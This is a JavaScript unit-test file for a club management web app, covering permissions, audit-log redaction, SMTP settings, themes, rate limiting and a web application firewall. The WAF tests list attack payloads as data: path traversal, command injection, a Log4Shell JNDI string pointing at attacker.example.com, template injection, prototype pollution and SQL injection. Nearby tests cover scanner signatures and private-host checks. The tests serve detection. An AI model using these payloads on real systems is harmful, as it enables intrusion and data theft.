	assert.ok(Math.abs(dag[0].oran + dag[1].oran - 1) < 1e-9);
	const ay = aylikAkis(rows, t('2026-10-06T00:30'), 3);
	assert.deepEqual(ay.map((m) => m.ay), ['2026-08', '2026-09', '2026-10']);
	assert.deepEqual(ay.map((m) => [m.gelir, m.gider]), [[3500000, 0], [0, 890000], [0, 280000]]);
	assert.deepEqual(aylikAkis(rows, t('2026-01-15T00:00'), 2).map((m) => m.ay), ['2025-12', '2026-01']); // across a year
	const fold = (s) => s.toLocaleLowerCase('tr').normalize('NFD').replace(/[\u0300-\u036f]/g, '').replace(/ı/g, 'i');
	assert.deepEqual(filtreleKayitlar(rows, { tur: 'gider', ay: '2026-10' }).map((r) => r.id), ['d', 'e']);
	assert.deepEqual(filtreleKayitlar(rows, { arama: 'CAY', fold }).map((r) => r.id), ['d']);
	assert.deepEqual(filtreleKayitlar(rows, { arama: 'mehmet', fold }).map((r) => r.id), ['c']);
	assert.deepEqual(filtreleKayitlar(rows, { kategori: 'Donanım' }).map((r) => r.id), ['c', 'e']);
	const now = t('2026-10-06T00:30');
	assert.ok(tarihGecerliMi(now, now) && tarihGecerliMi(t('2025-01-01'), now));
	assert.ok(!tarihGecerliMi(now + 3 * 86_400_000, now) && !tarihGecerliMi(t('2020-01-01'), now) && !tarihGecerliMi(NaN, now));
});

/* ---------------- inventory ---------------- */

check('inventory codes, loan windows and due text', () => {
	assert.equal(normalizeKod(' lab rpi 006 '), 'LAB-RPI-006');
	assert.equal(kodHatasi('LAB-RPI-006'), null);
	assert.ok(kodHatasi('LAB_RPI') && kodHatasi('AB') && kodHatasi('-LAB') && kodHatasi('LAB--X') && kodHatasi('A'.repeat(25)));
	const DAY = 86_400_000;
	const now = new Date('2026-10-06T10:00').getTime();
	assert.deepEqual(iadeDurumu(now + 5 * DAY + 1000, now), { gecikti: false, gun: 5 });
	assert.deepEqual(iadeDurumu(now + 3600_000, now), { gecikti: false, gun: 0 });
	assert.deepEqual(iadeDurumu(now - 1000, now), { gecikti: true, gun: 1 });
	assert.deepEqual(iadeDurumu(now - 2.5 * DAY, now), { gecikti: true, gun: 2 });
	assert.deepEqual(iadeDurumu(now - 3 * DAY - 3600_000, now), { gecikti: true, gun: 3 });
	assert.equal(iadeDurumu(null, now), null);
	assert.equal(iadeMetni(now - 2.5 * DAY, now), '2 gün gecikti');
	assert.equal(iadeMetni(now + 3600_000, now), 'Bugün iade');
	assert.equal(iadeMetni(now + 1.5 * DAY, now), 'Yarın iade');
	assert.equal(iadeMetni(now + 9.2 * DAY, now), '9 gün kaldı');
	// windows
	assert.equal(iadeTarihiHatasi(now + 14 * DAY, { now, yonetim: false }), null);
	assert.ok(iadeTarihiHatasi(now + 45 * DAY, { now, yonetim: false }));
	assert.equal(iadeTarihiHatasi(now + 45 * DAY, { now, yonetim: true }), null);
	assert.ok(iadeTarihiHatasi(now - DAY, { now, yonetim: true }));
	assert.ok(iadeTarihiHatasi(Number.NaN, { now, yonetim: true }));
	// extending: counted from when the loan started, not from now
	const started = now - 20 * DAY;
	assert.equal(iadeTarihiHatasi(now + 9 * DAY, { now, baslangic: started, yonetim: false }), null);
	assert.ok(iadeTarihiHatasi(now + 12 * DAY, { now, baslangic: started, yonetim: false }));
	const end = new Date(gunSonu(now));
	assert.deepEqual([end.getHours(), end.getMinutes(), end.getDate()], [23, 59, 6]);
});

/* ---------------- core ---------------- */

check('core text helpers', () => {
	assert.equal(escapeHtml(`<a href="x">'&'</a>`), '&lt;a href=&quot;x&quot;&gt;&#39;&amp;&#39;&lt;/a&gt;');
	assert.equal(escapeHtml(null), '');
	assert.equal(initials('Ayşe Nur Yılmaz'), 'AY');
	assert.equal(initials('ilker'), 'İ');
	assert.equal(initials(''), '?');
});

check('permissions: levels, defaults, escalation, validation', () => {
	const uye = { news: 'kullan', events: 'kullan' };
	assert.equal(canUse(uye, 'news'), true);
	assert.equal(canManage(uye, 'news'), false);
	assert.equal(canUse(uye, 'budget'), false);
	assert.equal(canUse(null, 'budget'), false);
	assert.equal(canUse({}, 'settings'), true); // personal settings for everyone
	assert.equal(canManage({}, 'settings'), false);
	assert.equal(seviyeOf(uye, 'nonexistent'), 'yok');
	for (const a of YETKI_UYGULAMALARI) {
		assert.equal(canManage(TUM_YETKILER, a), true, a);
		assert.ok(YETKI_ACIKLAMALARI[a]?.kullan && YETKI_ACIKLAMALARI[a]?.yonet, `description for ${a}`);
	}
	assert.deepEqual(fazlaYetkiler({ news: 'yonet', events: 'kullan' }, uye), ['news']);
	assert.deepEqual(fazlaYetkiler(uye, TUM_YETKILER), []);
	assert.deepEqual(fazlaYetkiler({ settings: 'kullan' }, {}), []); // implicit level is not an escalation
	assert.equal(herhangiYonetim(uye), false);
	assert.equal(herhangiYonetim({ notes: 'yonet' }), false);
	assert.equal(herhangiYonetim({ events: 'yonet' }), true);
	assert.deepEqual(normalizeIzinler({ news: 'kullan', budget: 'yok' }).value, { news: 'kullan' });
	assert.ok(normalizeIzinler({ hack: 'yonet' }).error);
	assert.ok(normalizeIzinler({ news: 'admin' }).error);
	assert.ok(normalizeIzinler([]).error);
	assert.equal(rolHatasi({ ad: 'Yönetim Kurulu', renk: '#ff9f0a' }), null);
	assert.ok(rolHatasi({ ad: 'Y', renk: '#ff9f0a' }));
	assert.ok(rolHatasi({ ad: 'Yönetim', renk: 'red' }));
});

check('permissions: who may hand out which role', () => {
	const admin = { admin: true, izinler: TUM_YETKILER };
	const kurul = { admin: false, izinler: { ...TUM_YETKILER } };
	const sekreter = { admin: false, izinler: { members: 'yonet', news: 'kullan' } };
	const haberci = { id: 'rol_h', izinler: { news: 'kullan' } };
	// The admin role: only an admin, even for someone holding every permission.
	assert.equal(rolVerilebilirMi({ id: ADMIN_ROL_ID, izinler: TUM_YETKILER }, admin), true);
	assert.equal(rolVerilebilirMi({ id: ADMIN_ROL_ID, izinler: TUM_YETKILER }, kurul), false);
	// Equal or weaker: yes. Stronger in any app: no.
	assert.equal(rolVerilebilirMi(haberci, sekreter), true);
	assert.equal(rolVerilebilirMi({ id: 'rol_k', izinler: TUM_YETKILER }, kurul), true);
	assert.equal(rolVerilebilirMi({ id: 'rol_x', izinler: { news: 'yonet' } }, sekreter), false);
	assert.equal(rolVerilebilirMi({ id: 'rol_y', izinler: { budget: 'kullan' } }, sekreter), false);
	assert.equal(rolVerilebilirMi({ id: 'rol_bos', izinler: {} }, sekreter), true);
});

check('apps: manifests are consistent', () => {
	const ids = ALL_MANIFESTS.map((m) => m.id);
	assert.equal(new Set(ids).size, ids.length, 'unique ids');
	assert.deepEqual([...YETKI_UYGULAMALARI], ids, 'the role editor lists every manifest, in manifest order');
	for (const m of WINDOW_MANIFESTS) {
		assert.ok(m.window.width >= (m.window.minWidth ?? 0) && m.window.height >= (m.window.minHeight ?? 0), `${m.id}: window smaller than its minimum`);
		assert.ok(m.en.title && m.en.shortTitle && m.en.description, `${m.id}: English texts`);
		assert.match(appColor(m.id), /^#[0-9a-f]{6}$/i, `${m.id}: colour`);
	}
	assert.deepEqual([...DEFAULT_DOCK_ORDER].sort(), WINDOW_MANIFESTS.map((m) => m.id).sort(), 'every window app is in the default dock');
	// Menu item ids carry translations and special actions: one id, one meaning.
	const seen = new Map();
	for (const m of WINDOW_MANIFESTS) {
		const items = [m.menu?.about, ...(m.menu?.defaultItems ?? []), ...(m.menu?.categories ?? []).flatMap((c) => c.items)].filter(Boolean);
		for (const item of items) {
			assert.ok(item.label.tr && item.label.en, `${m.id}/${item.id}: both languages`);
			const key = JSON.stringify([item.label, item.shortcut ?? null]);
			if (seen.has(item.id)) assert.equal(seen.get(item.id).key, key, `menu item "${item.id}" differs between ${seen.get(item.id).app} and ${m.id}`);
			else seen.set(item.id, { key, app: m.id });
		}
	}
	const hotkeys = WINDOW_MANIFESTS.map((m) => m.hotkey).filter(Boolean);
	assert.equal(new Set(hotkeys).size, hotkeys.length, 'unique hotkeys');
});

check('posta: previews, skipped-recipient wording, folders and actions', () => {
	assert.equal(onizlemeSatiri('  Merhaba\n\n dünya  '), 'Merhaba dünya');
	assert.equal(onizlemeSatiri('x'.repeat(200), 10), `${'x'.repeat(9)}…`);
	assert.match(atlananAciklamasi({ id: '1', ad: 'Ayşe Yılmaz', neden: 'role' }), /roleü Posta'yı açmıyor/);
	assert.match(atlananAciklamasi({ id: '1', ad: 'Ayşe Yılmaz', neden: 'pasif' }), /aktif üye değil/);
	assert.deepEqual([...POSTA_KLASORLERI], ['gelen', 'gonderilen', 'arsiv', 'cop']);
	assert.equal(new Set(POSTA_ISLEMLERI).size, POSTA_ISLEMLERI.length);
	// Mail opens with `kullan`, and the message kind needs just `kullan`.
	assert.equal(BILDIRIM_TURLERI.message.appId, 'chat');
	assert.equal(BILDIRIM_TURLERI.message.seviye, 'kullan');
});

check('notifications: every kind belongs to a permission app', () => {
	const kinds = ['approval', 'projectProposal', 'teamApplication', 'teamDecision', 'task', 'assigned', 'loan', 'checkin', 'event', 'news', 'certificate', 'message'];
	assert.deepEqual(Object.keys(BILDIRIM_TURLERI).sort(), [...kinds].sort());
	for (const [kind, rule] of Object.entries(BILDIRIM_TURLERI)) {
		assert.ok(YETKI_UYGULAMALARI.includes(rule.appId), `${kind} → ${rule.appId}`);
		assert.ok(rule.seviye === 'kullan' || rule.seviye === 'yonet', kind);
	}
	// Only-news role: news and always-open chat messages pass; the admin's permissions pass every kind.
	const only = Object.entries(BILDIRIM_TURLERI).filter(([, r]) => (r.seviye === 'yonet' ? canManage : canUse)({ news: 'kullan' }, r.appId)).map(([k]) => k);
	assert.deepEqual(only.sort(), ['message', 'news']);
	assert.equal(Object.values(BILDIRIM_TURLERI).every((r) => canManage(TUM_YETKILER, r.appId)), true);
});

/* ---------------- audit log ---------------- */

const ASLA = /pass|parola|password|hash|totp|secret|token|recovery|kurtarma|cookie|oturum/i;

check('audit: credential-looking keys never survive temizle / kayitAlanlari', () => {
	const kirli = {
		ad: 'Ayşe',
		passwordHash: '$2b$10$abc',
		nested: { totpSecret: 'JBSWY3DP', aktifOturumToken: 'tok', recoveryCodes: ['a'], iyi: 1 },
		smtp_pass: 'cipher',
		liste: [{ password: 'x', ok: true }],
	};
	const out = temizle(kirli);
	assert.deepEqual(out, { ad: 'Ayşe', nested: { iyi: 1 }, liste: [{ ok: true }] });
	assert.equal(ASLA.test(JSON.stringify(out)), false);
	assert.equal(kayitAlanlari(null), null);
	assert.deepEqual(kayitAlanlari({ token: 'x', a: 1 }), { a: 1 });
	// Bounded: very long text is cut, undefined/NaN do not break JSON.
	assert.equal(temizle('x'.repeat(1000)).length, 301);
	assert.equal(temizle(NaN), null);
});

check('audit: rolOzeti keeps a white-list and drops "yok" rows; rolFarki lists only changes', () => {
	const ham = { ad: 'Kurul', renk: '#fff', aciklama: null, ikiAdimZorunlu: 1, izinler: { budget: 'yok', news: 'kullan', events: 'yonet' }, passwordHash: 'x', id: 'rol_1' };
	const o = rolOzeti(ham);
	assert.deepEqual(Object.keys(o).sort(), ['aciklama', 'ad', 'ikiAdimZorunlu', 'izinler', 'renk']);
	assert.deepEqual(o.izinler, { events: 'yonet', news: 'kullan' });
	assert.equal(o.ikiAdimZorunlu, true);
	assert.equal(rolFarki(o, rolOzeti(ham)), null);
	const yeni = rolOzeti({ ...ham, ad: 'Yönetim', izinler: { budget: 'yonet', news: 'kullan' } });
	assert.deepEqual(rolFarki(o, yeni), {
		onceki: { ad: 'Kurul', izinler: { budget: 'yok', events: 'yonet' } },
		sonraki: { ad: 'Yönetim', izinler: { budget: 'yonet', events: 'yok' } },
	});
});

check('audit: uyeOzeti is name + e-mail (+ status/role), never anything else', () => {
	const u = uyeOzeti({ ad: 'Ali', soyad: 'Veli', email: 'a@v.test', passwordHash: 'h', totpSecret: 's', aktifOturumToken: 't', status: 'aktif' });
	assert.deepEqual(u, { ad: 'Ali Veli', email: 'a@v.test', status: 'aktif' });
	assert.equal(uyeHedefAdi({ ad: 'Ali', soyad: 'Veli', email: 'a@v.test' }), 'Ali Veli (a@v.test)');
});

check('audit: alanFarki / farkSatirlari', () => {
	assert.equal(alanFarki({ a: 1, b: 2 }, { a: 1, b: 2 }), null);
	assert.deepEqual(alanFarki({ status: 'beklemede', roleId: null }, { status: 'aktif', roleId: 'rol_uye' }), {
		onceki: { status: 'beklemede', roleId: null },
		sonraki: { status: 'aktif', roleId: 'rol_uye' },
	});
	const satirlar = farkSatirlari({ ad: 'A', izinler: { budget: 'yok' } }, { ad: 'B', izinler: { budget: 'yonet' } });
	assert.deepEqual(satirlar, [
		{ alan: 'ad', onceki: 'A', sonraki: 'B' },
		{ alan: 'izinler.budget', onceki: 'yok', sonraki: 'yonet' },
	]);
	assert.deepEqual(farkSatirlari(null, { a: true }), [{ alan: 'a', onceki: null, sonraki: true }]);
});

check('audit: smtpFarki never carries the password, only that it changed', () => {
	const varsayilan = { smtp_host: 'smtp.gmail.com', smtp_port: '465', smtp_secure: 'true', smtp_user: '', smtp_from: 'K <k@x.test>' };
	const yeni = { smtp_host: 'smtp.gmail.com', smtp_port: '465', smtp_secure: 'true', smtp_user: 'kulup@x.test', smtp_from: 'K <k@x.test>', smtp_pass: 'enc:v1:GIZLI-SIFRELI-DEGER' };
	const f = smtpFarki({}, yeni, varsayilan);
	assert.deepEqual(f, { onceki: { smtp_user: '', uygulamaAnahtari: 'yok' }, sonraki: { smtp_user: 'kulup@x.test', uygulamaAnahtari: 'degisti' } });
	assert.equal(JSON.stringify(f).includes('GIZLI'), false);
	// Same values again: nothing to record. Clearing a password that was never set: nothing either.
	assert.equal(smtpFarki({ smtp_user: 'kulup@x.test' }, { smtp_user: 'kulup@x.test', smtp_pass: '' }, varsayilan), null);
	assert.deepEqual(smtpFarki({ smtp_pass: 'enc' }, { smtp_pass: '' }, varsayilan), { onceki: { uygulamaAnahtari: 'var' }, sonraki: { uygulamaAnahtari: 'silindi' } });
	// Port change reads against the stored value, falling back to the default.
	assert.deepEqual(smtpFarki({}, { smtp_port: '587' }, varsayilan), { onceki: { smtp_port: '465' }, sonraki: { smtp_port: '587' } });
});

/* ---------------- SMTP connection test ---------------- */

check('smtp test: private hosts are recognised, public ones are not', () => {
	for (const h of ['localhost', '127.0.0.1', '10.1.2.3', '192.168.0.9', '172.20.0.1', '169.254.169.254', '[::1]', ' LOCALHOST ', '::ffff:127.0.0.1', 'app.internal', 'mybox.local', '0177.0.0.1', 'metadata.google.internal', 'srv.lan']) assert.equal(isPrivateHost(h), true, h);
	for (const h of ['smtp.gmail.com', 'mail.example.org', '8.8.8.8', '172.32.0.1']) assert.equal(isPrivateHost(h), false, h);
});

check('audit: smtpFarki ignores keys it no longer tracks (old imap_* rows), still never the password', () => {
	const varsayilan = { smtp_host: '', smtp_port: '465', smtp_secure: 'true', smtp_user: '', smtp_from: '' };
	const f = smtpFarki({}, { ...varsayilan, imap_host: 'imap.eski.test', smtp_pass: 'enc:v1:GIZLI' }, varsayilan);
	assert.deepEqual(f, { onceki: { uygulamaAnahtari: 'yok' }, sonraki: { uygulamaAnahtari: 'degisti' } });
	assert.equal(JSON.stringify(f).includes('GIZLI'), false);
	assert.equal(smtpFarki({ imap_host: 'a' }, { imap_host: 'b', imap_secure: 'false' }, varsayilan), null);
});

check('audit: durumIslemi names the status change', () => {
	assert.equal(durumIslemi('beklemede', 'aktif'), 'basvuru.onayla');
	assert.equal(durumIslemi('beklemede', 'reddedildi'), 'basvuru.reddet');
	assert.equal(durumIslemi('aktif', 'mezun'), 'uye.mezun');
	assert.equal(durumIslemi('mezun', 'aktif'), 'uye.aktif');
	assert.equal(durumIslemi('aktif', 'beklemede'), 'uye.status');
	assert.equal(durumIslemi('aktif', 'aktif'), null);
	for (const op of ['basvuru.onayla', 'basvuru.reddet', 'uye.mezun', 'uye.aktif', 'uye.status']) assert.ok(DENETIM_ISLEMLERI.includes(op), op);
});

check('audit: suzgecOku bounds the query, temizIp the address, saklamaGunu the retention', () => {
	const f = suzgecOku(new URLSearchParams('kisi=%20ali%20&role=rol_x&islem=role.sil&from=2026-01-05&to=2026-02-31x&sayfa=-3&boyut=99999'));
	assert.equal(f.kisi, 'ali');
	assert.equal(f.role, 'rol_x');
	assert.equal(f.islem, 'role.sil');
	assert.equal(f.from, '2026-01-05');
	assert.equal(f.to, '');
	assert.equal(f.sayfa, 1);
	assert.equal(f.boyut, 200);
	assert.equal(suzgecOku(new URLSearchParams('islem=DROP')).islem, '');
	assert.equal(suzgecOku(new URLSearchParams('')).boyut, 50);
	assert.equal(temizIp('203.0.113.7'), '203.0.113.7');
	assert.equal(temizIp('1.2.3.4\r\nX-Evil: 1'), '1.2.3.4X-Evil:1');
	assert.equal(temizIp('a'.repeat(500)).length, 64);
	assert.equal(temizIp(''), 'unknown');
	assert.equal(saklamaGunu(undefined), DENETIM_SAKLAMA_GUN);
	assert.equal(DENETIM_SAKLAMA_GUN, 730);
	assert.equal(saklamaGunu('365'), 365);
	assert.equal(saklamaGunu('3'), DENETIM_SAKLAMA_GUN);
	assert.equal(saklamaGunu('abc'), DENETIM_SAKLAMA_GUN);
});

check('audit: CSV rows are flat, formula-safe through toCsv, one column per header', () => {
	const registration = { id: '1', zaman: Date.UTC(2026, 0, 2, 3, 4, 5), yapanId: 'u1', yapanAd: '=cmd|x', islem: 'role.sil', hedefTur: 'role', hedefId: 'rol_1', hedefAd: 'Üye; "Kurul"', onceki: { ad: 'A' }, sonraki: null, ip: '10.0.0.1' };
	const satirlar = denetimCsvSatirlari([registration]);
	assert.equal(satirlar.length, 1);
	assert.equal(satirlar[0].length, DENETIM_CSV_BASLIKLARI.length);
	assert.equal(satirlar[0][0], '2026-01-02T03:04:05.000Z');
	assert.equal(satirlar[0][7], '{"ad":"A"}');
	assert.equal(satirlar[0][8], '');
	const csv = toCsv(DENETIM_CSV_BASLIKLARI, satirlar);
	assert.ok(csv.includes("'=cmd|x"), 'formula neutralised');
	assert.ok(csv.includes('"Üye; ""Kurul"""'));
});

check('settings: one section per tab, system pages flagged', () => {
	assert.deepEqual(SETTINGS_SECTIONS.map((s) => s.id).sort(), [...SETTINGS_TAB_IDS].sort());
	assert.deepEqual(SETTINGS_SECTIONS.filter((s) => s.sistem).map((s) => s.id).sort(), ['community', 'integrations', 'roles', 'smtp']);
	for (const s of SETTINGS_SECTIONS) assert.ok(s.labelKey && s.group, s.id);
});

check('kurulum: production never carries the reason, development does', () => {
	const eksik = { hazir: false, sebep: 'BOOTSTRAP_ADMIN_EMAIL ve BOOTSTRAP_ADMIN_PASSWORD tanımlı değil.' };
	assert.deepEqual(kurulumYaniti({ hazir: true }, 'production'), { hazir: true });
	assert.deepEqual(kurulumYaniti(eksik, 'production'), { hazir: false, mesaj: KURULUM_GENEL_MESAJ });
	assert.equal(JSON.stringify(kurulumYaniti(eksik, 'production')).includes('BOOTSTRAP'), false);
	assert.equal(kurulumYaniti(eksik, 'development').sebep, eksik.sebep);
	assert.equal(kurulumYaniti(eksik, undefined).sebep, eksik.sebep);
	assert.equal(kurulumYaniti({ hazir: true, sebep: 'x' }, 'development').sebep, undefined);
});

checkAsync('kurulum: lookups are shared for the cache window', async () => {
	let calls = 0;
	let clock = 1000;
	const get = createKurulumCache(async () => ({ hazir: ++calls > 1 }), 5000, () => clock);
	const [a, b] = await Promise.all([get(), get()]);
	assert.equal(calls, 1);
	assert.deepEqual([a.hazir, b.hazir], [false, false]);
	clock += 4999;
	await get();
	assert.equal(calls, 1);
	clock += 1;
	assert.equal((await get()).hazir, true);
	assert.equal(calls, 2);
});

check('tema: preferences parse field by field and fall back to the defaults', () => {
	assert.deepEqual(parseThemePrefs(null), DEFAULT_THEME_PREFS);
	assert.deepEqual(parseThemePrefs(''), DEFAULT_THEME_PREFS);
	assert.deepEqual(parseThemePrefs('{bozuk'), DEFAULT_THEME_PREFS);
	assert.deepEqual(parseThemePrefs('42'), DEFAULT_THEME_PREFS);
	assert.deepEqual(parseThemePrefs('{"theme":"dark","accent":"pink","transparency":true,"reduceMotion":false}'), { theme: 'dark', accent: 'pink', transparency: true, reduceMotion: false });
	assert.deepEqual(parseThemePrefs('{"theme":"mor","accent":"kirmizi","transparency":"evet","reduceMotion":1}'), DEFAULT_THEME_PREFS);
	assert.equal(parseThemePrefs('{"theme":"light","accent":"nope"}').theme, 'light');
	const prefs = { theme: 'light', accent: 'green', transparency: true, reduceMotion: true };
	assert.deepEqual(parseThemePrefs(serializeThemePrefs(prefs)), prefs);
	assert.equal(DEFAULT_THEME_PREFS.transparency, false);
	assert.equal(ACCENTS.length, 6);
});

check('tema: system follows the OS, an explicit choice does not', () => {
	assert.equal(resolveTheme('system', true), 'dark');
	assert.equal(resolveTheme('system', false), 'light');
	assert.equal(resolveTheme('light', true), 'light');
	assert.equal(resolveTheme('dark', false), 'dark');
	assert.equal(toggledTheme('dark'), 'light');
	assert.equal(toggledTheme('light'), 'dark');
	assert.equal(resolveReduceMotion(null, true), true);
	assert.equal(resolveReduceMotion(null, false), false);
	assert.equal(resolveReduceMotion(false, true), false);
	assert.equal(resolveReduceMotion(true, false), true);
});

checkAsync('tema: the <head> boot script writes what htmlAttributes says', async () => {
	const { runInNewContext } = await import('node:vm');
	const boot = (stored, dark, reduced, broken = false) => {
		const attrs = {};
		const classes = new Set();
		const document = { documentElement: { setAttribute: (k, v) => (attrs[k] = v), classList: { toggle: (c, on) => (on ? classes.add(c) : classes.delete(c)) } } };
		const localStorage = { getItem: (k) => (broken ? assert.fail('unreachable') : k === THEME_STORAGE_KEY ? stored : null) };
		const matchMedia = (q) => ({ matches: q.includes('color-scheme') ? dark : reduced });
		if (broken) localStorage.getItem = () => { throw new Error('SecurityError'); };
		runInNewContext(themeBootScript(), { document, localStorage, matchMedia });
		return { attrs, dark: classes.has('dark') };
	};
	const stored = [
		null,
		'{bozuk',
		'{"theme":"dark"}',
		'{"theme":"light","accent":"purple","transparency":true}',
		'{"theme":"system","accent":"graphite","reduceMotion":false}',
		'{"theme":"system","reduceMotion":true,"transparency":false}',
		'{"theme":"x","accent":"y","transparency":"on","reduceMotion":"yes"}',
	];
	for (const raw of stored) {
		for (const dark of [false, true]) {
			for (const reduced of [false, true]) {
				const a = htmlAttributes(parseThemePrefs(raw), dark, reduced);
				const got = boot(raw, dark, reduced);
				assert.deepEqual(got.attrs, { 'data-theme': a.theme, 'data-accent': a.accent, 'data-transparency': a.transparency, 'data-motion': a.motion }, String(raw));
				assert.equal(got.dark, a.theme === 'dark');
			}
		}
	}
	// A storage error (private window): defaults, no throw.
	const fallback = boot(null, true, false, true);
	assert.deepEqual(fallback.attrs, { 'data-theme': 'dark', 'data-accent': 'blue', 'data-transparency': 'off', 'data-motion': 'full' });
});

check('tema: one wallpaper catalogue, walked in order', () => {
	assert.equal(new Set(WALLPAPERS.map((w) => w.id)).size, WALLPAPERS.length);
	assert.equal(new Set(WALLPAPERS.map((w) => w.src)).size, WALLPAPERS.length);
	assert.equal(DEFAULT_WALLPAPER, '3d-aurora');
	assert.equal(nextWallpaper(WALLPAPERS[0].src), WALLPAPERS[1].src);
	assert.equal(nextWallpaper(WALLPAPERS[WALLPAPERS.length - 1].src), WALLPAPERS[0].src);
	assert.equal(nextWallpaper('/wallpapers/bilinmeyen.jpg'), WALLPAPERS[0].src);
	assert.equal(isAuroraWallpaper('3d-aurora'), true);
	assert.equal(isAuroraWallpaper('/wallpapers/3D-Aurora.png'), true);
	assert.equal(isAuroraWallpaper('/wallpapers/39620.jpg'), false);
	assert.equal(wallpaperPreview('3d-aurora'), '/wallpapers/3D-Aurora.png');
	assert.equal(wallpaperPreview('/wallpapers/39620.jpg'), '/wallpapers/39620.jpg');
	assert.equal(wallpaperInfo('/baska.jpg').id, 'custom');
});

check('hız sınırı: sabit pencere, sorgu sıklığı pencereyi uzatmaz, anahtarlar ayrı', () => {
	const real = Date.now;
	let now = 1_000_000;
	Date.now = () => now;
	try {
		for (let i = 0; i < 5; i++) assert.equal(consumeRateLimit('t:a', 5, 60_000).allowed, true);
		// Reddedilen çağrılar süreyi ileri atmaz: eski sürümde her çağrı `last` değerini sıfırlıyordu.
		for (let t = 0; t < 59; t += 10) {
			now = 1_000_000 + t * 1000;
			assert.equal(consumeRateLimit('t:a', 5, 60_000).allowed, false);
		}
		assert.equal(consumeRateLimit('t:b', 5, 60_000).allowed, true);
		now = 1_000_000 + 60_000;
		assert.equal(consumeRateLimit('t:a', 5, 60_000).allowed, true);
	} finally {
		Date.now = real;
	}
});

check('clientAddress: prioritizes CF-Connecting-IP over proxy X-Forwarded-For and validates IPs', () => {
	assert.equal(parseIpCandidate('203.0.113.42'), '203.0.113.42');
	assert.equal(parseIpCandidate('203.0.113.42:54321'), '203.0.113.42');
	assert.equal(parseIpCandidate('[2001:db8::1]:443'), '2001:db8::1');
	assert.equal(parseIpCandidate('[2001:DB8:ABCD::1]:443'), '2001:db8:abcd::1');
	assert.equal(parseIpCandidate('2001:db8::1%eth0'), '2001:db8::1');
	assert.equal(parseIpCandidate('unknown'), null);
	assert.equal(parseIpCandidate('not-an-ip'), null);

	// 1. Behind Cloudflare + Caddy where X-Forwarded-For / X-Real-IP might carry Cloudflare's edge IP
	const cfReq = new Request('https://beuteknoloji.org/api/auth/login', {
		headers: {
			'cf-connecting-ip': '85.105.44.12',
			'x-real-ip': '172.64.100.5',
			'x-forwarded-for': '172.64.100.5',
		},
	});
	assert.equal(clientAddress(cfReq), '85.105.44.12');

	// 2. True-Client-IP fallback when CF-Connecting-IP is absent
	const trueClientReq = new Request('https://beuteknoloji.org/api/auth/login', {
		headers: {
			'true-client-ip': '2A02:4E0:2D10::1',
			'x-forwarded-for': '104.16.1.1',
		},
	});
	assert.equal(clientAddress(trueClientReq), '2a02:4e0:2d10::1');

	// 3. X-Forwarded-For chain when direct headers are absent or invalid
	const xffReq = new Request('https://beuteknoloji.org/api/auth/login', {
		headers: {
			'cf-connecting-ip': 'invalid-header',
			'x-forwarded-for': 'unknown, 198.51.100.77:8080, 10.0.0.1',
		},
	});
	assert.equal(clientAddress(xffReq), '198.51.100.77');

	// 4. No headers -> 'unknown'
	const emptyReq = new Request('https://beuteknoloji.org/api/auth/login');
	assert.equal(clientAddress(emptyReq), 'unknown');
});

check('waf: inspectRequestComponents detects offensive scanners, traversal, cmdi, sqli, and xss without false positives', () => {
	// Clean legitimate requests
	assert.deepEqual(
		inspectRequestComponents({
			pathname: '/api/etkinlikler',
			search: '?q=Yapay+Zeka+At%C3%B6lyesi&page=1',
			userAgent: UA.macSafari,
		}),
		{ matched: false, points: 0 }
	);

	// Malformed URI encoding should not throw
	assert.equal(
		inspectRequestComponents({
			pathname: '/api/haberler/%E0%A4%A',
			search: '?q=%ZZ',
		}).matched,
		false
	);

	// Malformed percent sequence mixed with encoded SQLi payload must NOT bypass decoding
	const mixedMalformed = inspectRequestComponents({
		pathname: '/api/uyeler',
		search: '?bad=%ZZ&q=1%20UNION%20SELECT%201',
	});
	assert.equal(mixedMalformed.matched, true);
	assert.equal(mixedMalformed.category, 'sqli');

	// Double URL-encoded traversal must be caught
	const doubleEncodedTraversal = inspectRequestComponents({
		pathname: '/api/dosya',
		search: '?file=%252e%252e%252f%252e%252e%252fetc%252fpasswd',
	});
	assert.equal(doubleEncodedTraversal.matched, true);
	assert.equal(doubleEncodedTraversal.category, 'path_traversal');

	// Offensive Scanner User-Agents
	for (const bot of ['sqlmap/1.8', 'Mozilla/5.0 (compatible; Nuclei - Open-source project)', 'ffuf/v2.1.0', 'Nikto/2.5.0']) {
		const res = inspectRequestComponents({ pathname: '/api/uyeler', userAgent: bot });
		assert.equal(res.matched, true, bot);
		assert.equal(res.category, 'scanner', bot);
		assert.ok(res.points >= 80, bot);
	}

	// AI Reconnaissance & Honeypot Canary Paths
	for (const canary of ['/.env', '/.env.local', '/.git/config', '/wp-admin/install.php', '/wp-login.php', '/phpmyadmin', '/actuator/health']) {
		const res = inspectRequestComponents({ pathname: canary });
		assert.equal(res.matched, true, canary);
		assert.equal(res.category, 'scanner', canary);
		assert.equal(res.points, 100, canary);
	}

	// Path Traversal / LFI
	for (const target of ['/api/dosya/../../etc/passwd', '/api/test?file=%2e%2e%2f%2e%2e%2fetc%2fshadow', '/api/read?p=/proc/self/environ']) {
		const res = inspectRequestComponents({ pathname: target });
		assert.equal(res.matched, true, target);
		assert.equal(res.category, 'path_traversal', target);
	}

	// Command Injection / Log4Shell
	for (const sample of [
		{ pathname: '/api/ping', search: '?host=127.0.0.1;whoami' },
		{ pathname: '/api/ping', search: '?x=$(cat /etc/passwd)' },
		{ pathname: '/api/login', userAgent: '${jndi:ldap://attacker.example.com/a}' },
	]) {
		const res = inspectRequestComponents(sample);
		assert.equal(res.matched, true, JSON.stringify(sample));
		assert.equal(res.category, 'cmd_injection', JSON.stringify(sample));
	}

	// Server-Side Template Injection (SSTI)
	for (const q of [
		'?q={{7*7}}',
		'?q={{ 7 * 7 }}',
		'?q=${7*7}',
		'?q=${ 7 * 7 }',
		'?q={{ 10 / 2 }}',
		'?name={{config}}',
		'?template=<%=7*7%>',
		'?x={{self}}',
		'?ctx={{ lipsum }}',
	]) {
		const res = inspectRequestComponents({ pathname: '/api/search', search: q });
		assert.equal(res.matched, true, q);
		assert.equal(res.category, 'cmd_injection', q);
	}

	// Prototype Pollution
	for (const q of [
		'?__proto__[polluted]=true',
		'?__proto__.isAdmin=true',
		'?constructor[prototype][isAdmin]=true',
		'?constructor.prototype[admin]=true',
		'?prototype.polluted=yes',
	]) {
		const res = inspectRequestComponents({ pathname: '/api/data', search: q });
		assert.equal(res.matched, true, q);
		assert.equal(res.category, 'cmd_injection', q);
	}

	// SQL Injection (including inline comment obfuscation and string/numeric tautologies)
	for (const q of [
		"?id=1' OR '1'='1'",
